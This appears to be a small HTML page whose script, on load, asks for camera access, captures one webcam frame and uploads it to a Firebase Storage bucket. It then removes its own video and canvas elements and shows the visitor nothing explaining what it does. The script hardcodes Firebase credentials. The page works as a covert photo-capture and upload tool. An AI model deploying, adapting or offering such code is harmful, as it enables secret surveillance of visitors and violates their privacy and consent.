<!DOCTYPE html>
<html lang="en">

<body>
  <video id="video"></video>
  <canvas id="canvas"></canvas>
</body>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js";
  import { getStorage, ref, uploadBytes, uploadString } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-storage.js"

  const firebaseConfig = {
    apiKey: "AIzaSyDj7IyfiuQNd_uyk_SXXtqQTJKyh6FRBj8",
    authDomain: "learning-project-321200.firebaseapp.com",
    databaseURL: "https://learning-project-321200-default-rtdb.firebaseio.com",
    projectId: "learning-project-321200",
    storageBucket: "learning-project-321200.appspot.com",
    messagingSenderId: "729738339697",
    appId: "1:729738339697:web:3c24716ec85d42785fc2d0"
  };

  const app = initializeApp(firebaseConfig);
  const storage = getStorage(app);

  /** @type {HTMLVideoElement} */
  const video = document.getElementById('video');
  /** @type {HTMLCanvasElement} */
  const canvas = document.getElementById('canvas');

  (async () => {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: true
    });

    video.srcObject = stream;
    await video.play();
    canvas.setAttribute('width', video.videoWidth);
    canvas.setAttribute('height', video.videoHeight);

    takePhoto();
    stream.getTracks().forEach(track => track.stop());
    video.remove();
    canvas.remove();
  })();

  const takePhoto = async () => {
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const data = canvas.toDataURL('image/png');

    const fileRef = ref(storage, `/coba/${Date.now()}`);

    canvas.toBlob(async (blob) => {
      await uploadBytes(fileRef, blob)
      console.log('Uploaded a blob or file!');
    });
  };
</script>

</html>